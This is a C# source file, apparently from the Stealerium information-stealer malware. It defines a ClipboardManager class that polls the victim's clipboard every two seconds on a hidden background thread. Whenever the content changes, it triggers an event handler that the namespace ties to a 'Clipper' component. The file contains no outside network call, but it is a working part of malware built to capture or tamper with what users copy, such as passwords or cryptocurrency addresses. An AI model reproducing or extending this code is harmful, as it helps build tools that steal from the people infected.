using System;
using System.Threading;
using Stealerium.Stub.Clipper;

namespace Stealerium.Stub.Helpers
{
    internal sealed class ClipboardManager
    {
        // Stores the last clipboard content to avoid repeated checks
        private static string _previousClipboardContent = string.Empty;
        public static string ClipboardText { get; private set; } = string.Empty;

        // Thread for clipboard monitoring
        public static readonly Thread MainThread = new Thread(MonitorClipboard)
        {
            IsBackground = true
        };

        /// <summary>
        /// Monitors the clipboard for changes and triggers actions on change.
        /// </summary>
        private static void MonitorClipboard()
        {
            while (true)
            {
                try
                {
                    // Sleep to reduce load and check clipboard every 2 seconds
                    Thread.Sleep(2000);
                    ClipboardText = Clipboard.GetText();

                    // If clipboard content is the same, skip further actions
                    if (ClipboardText == _previousClipboardContent)
                        continue;

                    // Update previous content and trigger event/action
                    _previousClipboardContent = ClipboardText;
                    EventManager.Action();
                }
                catch (Exception ex)
                {
                    // Log any errors encountered during clipboard monitoring
                    Logging.Log($"ClipboardManager: Error while monitoring clipboard: {ex.Message}");
                }
            }
        }
    }
}
